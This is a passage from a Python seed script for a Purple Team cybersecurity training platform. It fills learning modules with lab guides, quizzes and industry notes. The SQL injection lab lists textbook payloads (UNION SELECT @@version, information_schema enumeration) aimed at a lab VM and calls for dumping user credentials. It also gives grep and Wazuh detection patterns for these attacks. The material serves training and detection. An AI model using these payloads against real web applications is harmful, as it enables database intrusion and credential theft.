""",
            "video_url": "https://www.youtube.com/watch?v=1X74U9-EB1g",
            "video_title": "SQL Injection Explained - Web Security",
            "video_source": "YouTube",
            "lab_guide_md": """## Purple Team Lab: SQL Injection Attack & Detection

### Environment
- **Attacker:** Kali Linux (192.168.56.5)
- **Target:** DVWA or SQLi-Lab VM (192.168.56.20)
- **Detection:** Wazuh + ModSecurity (192.168.56.30)

### Attack Phase
1. Identify injection points using single-quote test: `'`
2. Determine column count with ORDER BY
3. Extract database version: `' UNION SELECT @@version--`
4. Enumerate tables: `' UNION SELECT table_name FROM information_schema.tables--`
5. Dump user credentials

### Detection Phase
1. Review Apache/Nginx access logs forwarded to Wazuh
2. Search for SQL metacharacters in URIs:
```bash
grep -E "UNION|SELECT|information_schema|' OR '1'='1" /var/log/apache2/access.log
```
3. Create Wazuh rule for SQLi patterns:
```xml
<rule id="100101" level="12">
  <match>UNION.*SELECT|information_schema|' OR </match>
  <description>SQL Injection attempt detected</description>
</rule>
```
""",
            "lab_prerequisites": "DVWA or SQLi-Lab vulnerable web app, Kali Linux, Wazuh with log forwarding",
            "assessment_md": """## Knowledge Check

1. **Which SQLi type returns data through the same channel used to send the attack?**
   - [ ] Blind
   - [ ] Out-of-band
   - [ ] In-band
   - [ ] Stacked

2. **What character terminates a string in most SQL implementations?**
   - [ ] --
   - [ ] #
   - [ ] '
   - [ ] /*

3. **Which is the MOST effective mitigation against SQL injection?**
   - [ ] Input validation
   - [ ] Web Application Firewall
   - [ ] Parameterized queries
   - [ ] Escaping special characters
""",
            "real_world_md": """## Industry Context

### Real-World Incidents
- **Equifax (2017):** Unpatched Apache Struts CVE led to 147M record breach
- **Heartland Payment Systems (2008):** SQL injection in payment application → 134M credit cards exposed

### Detection Engineering
- Monitor for HTTP responses containing `information_schema`, `@@version`, `table_name`
- Alert on HTTP 500 errors with SQL syntax in the request
- Correlate SQLi attempts with subsequent data exfiltration patterns

### Purple Team Exercise
1. Deploy vulnerable app (DVWA) in lab
2. Execute SQLi attack step-by-step
3. Verify log evidence in Wazuh
4. Write detection rule
5. Document findings in Purple Team Log
"""
        }
    else:
        return _get_generic_module_content(topic_title)


def _get_generic_module_content(topic_title: str) -> dict:
    """Generate generic 5-component module content for any topic."""
    return {
        "theory_md": f"""# {topic_title} — Comprehensive Theory Guide

## Overview
This module covers the key principles, techniques, and security implications of **{topic_title}** in a Purple Team context.

## Learning Objectives
1. Understand the core mechanics and attack surface of {topic_title}
2. Execute hands-on attack simulations in the offline lab environment
3. Analyze telemetry and artifacts generated during exercises
4. Develop and validate defensive detection rules

## Core Concepts
- **Offensive Perspective:** How adversaries leverage {topic_title} in real attacks
- **Defensive Perspective:** Telemetry, log sources, and detection signatures
- **MITRE ATT&CK Mapping:** Techniques and procedures related to {topic_title}
- **Mitigation Controls:** Hardening steps and principle of least privilege
""",
        "video_url": "",
        "video_title": "",
        "video_source": "",
        "lab_guide_md": f"""## Purple Team Lab: {topic_title}

### Lab Environment
- **Attacker:** Kali Linux (192.168.56.5)
- **Target:** Windows 10 / GOAD Lab (192.168.56.10)
- **Detection:** Wazuh Manager (192.168.56.30)

### Prerequisites
- Kali Linux with Metasploit Framework
- Target VM configured and reachable
- Wazuh agent installed and forwarding logs

### Attack Steps
1. Reconnaissance: Enumerate target for {topic_title}-related indicators
2. Initial Access: Execute technique related to {topic_title}
3. Execution: Run attack commands and verify success
4. Document: Record all command output and system changes

### Detection Phase
1. Query Wazuh for Security Events during the attack window
2. Identify relevant Windows Security Event IDs / Sysmon events
3. Write custom detection rule in Sigma format
4. Validate rule triggers on attack replay

### MITRE ATT&CK Mapping
Consult MITRE ATT&CK Navigator to map your lab findings to specific techniques.
""",
        "lab_prerequisites": "Kali Linux VM, Windows target VM, Wazuh Manager with agent",
        "assessment_md": f"""## {topic_title} — Knowledge Assessment

### Multiple Choice

1. **What is the primary security concern related to {topic_title}?**
   - [ ] Confidentiality breach
   - [ ] Integrity compromise
   - [ ] Availability disruption
   - [ ] All of the above

2. **Which phase of the MITRE ATT&CK framework is most relevant to {topic_title}?**
   - [ ] Initial Access
   - [ ] Execution
   - [ ] Persistence
   - [ ] Defense Evasion

### Short Answer
Describe how a Purple Team operator would validate whether security controls effectively detect {topic_title}-related activity.

### Exercise
Execute a {topic_title}-related attack in the lab environment and document:
1. Commands executed
2. Telemetry generated in Wazuh
3. Detection rule created
""",
        "real_world_md": f"""## Real-World Application of {topic_title}

### Industry Use Cases
{topic_title} is applicable across multiple industry sectors including:
- Financial Services (banking malware, fraud detection)
- Healthcare (PHI protection, medical device security)
- Government (defense networks, critical infrastructure)
- Technology (cloud platforms, SaaS applications)

### Purple Team Workflow
1. **Threat Intelligence:** Research latest {topic_title} techniques used by threat actors
2. **Control Assessment:** Map your security stack against {topic_title} attack paths
3. **Detection Engineering:** Develop and test detection rules
4. **Purple Team Exercise:** Execute technique and validate alerts
5. **Reporting:** Document gaps and remediation recommendations

### Career Relevance
Proficiency in {topic_title} is essential for roles including:
- Security Operations Center (SOC) Analyst
- Threat Hunter
- Purple Team Engineer
- Penetration Tester
- Detection Engineer
"""
    }


def seed_all_topic_learning_modules(topics_by_title: dict[str, Topic]) -> int:
    """Ensure EVERY topic has a TopicLearningModule with all 5 components."""
    count = 0
    for title, topic in topics_by_title.items():
        slug = slugify(title)
        data = _get_module_content_for_topic(title, slug)
        video_url = data["video_url"] or (
            f"https://www.youtube.com/results?search_query=cybersecurity+"
            f"{slug.replace('-', '+')}"
        )
        video_title = data["video_title"] or f"{title} — Lecture & Hands-On Deep Dive"
        video_source = data["video_source"] or "YouTube Cybersecurity"

        existing = TopicLearningModule.query.filter_by(topic_id=topic.id).first()
        if existing:
            if not existing.video_url:
                existing.video_url = video_url
                existing.video_title = video_title
                existing.video_source = video_source
            continue

        module = TopicLearningModule(
            topic_id=topic.id,
            theory_md=data["theory_md"],
            video_url=video_url,
            video_title=video_title,
            video_source=video_source,
            lab_guide_md=data["lab_guide_md"],
            lab_prerequisites=data["lab_prerequisites"],
            assessment_md=data["assessment_md"],
            real_world_md=data["real_world_md"],
        )
        db.session.add(module)
        count += 1

    db.session.flush()
    return count


# ---------------------------------------------------------------------------
# Main Execution Entry Point
# ---------------------------------------------------------------------------
def main():
    with app.app_context():
        print("[*] Starting comprehensive Purple Team curriculum seed...")

        # 1. Base Taxonomy & Topics
        areas = seed_skill_areas()
        topics = seed_topics(areas)
        print(f"[+] Loaded {len(areas)} SkillAreas and {len(topics)} Topics.")

        # 2. Capstones & Job Roles
        capstones = seed_capstones()
        seed_roles(topics, capstones)
        print(f"[+] Loaded Capstone projects and JobRoles.")

        # 3. 12-Week Curriculum
        seed_curriculum_weeks(topics)
        print(f"[+] Configured 12-week curriculum weeks.")

        # 4. ContentItems (Theory Content for ALL Topics)
        new_content = seed_all_content_items(topics)
        print(f"[+] Seeded {new_content} new ContentItems (total: {ContentItem.query.count()}).")

        # 5. Offline vm_exercise Labs (Labs for ALL Topics)
        new_labs = seed_all_vm_labs(topics)
        print(f"[+] Seeded {new_labs} new vm_exercise Labs (total: {Lab.query.count()}).")

        # 6. Checkpoint Quiz Questions (Questions for ALL Topics)
        new_qs = seed_all_questions(topics, areas)
        print(f"[+] Seeded {new_qs} new AssessmentQuestions (total: {AssessmentQuestion.query.count()}).")

        # 7. Free 5-track learning paths (theory / video / labs / automation / soft skills)
        from seed_resources import seed_learning_paths, seed_professional_skills_area
        seed_professional_skills_area(areas, topics)
        n_path, n_path_labs = seed_learning_paths(topics)
        print(f"[+] Seeded {n_path} learning-path ContentItems and {n_path_labs} extra labs.")

        # 8. TopicLearningModule — 5-component learning modules
        new_modules = seed_all_topic_learning_modules(topics)
        print(f"[+] Seeded {new_modules} new TopicLearningModules (total: {TopicLearningModule.query.count()}).")

        # 9. Curated Video Lectures and Assessment Questions for ALL Topics
        import seed_all_videos_and_quizzes
        seed_all_videos_and_quizzes.main()

        db.session.commit()
        print("[SUCCESS] Comprehensive Purple Team curriculum data population complete!")


if __name__ == "__main__":
    main()
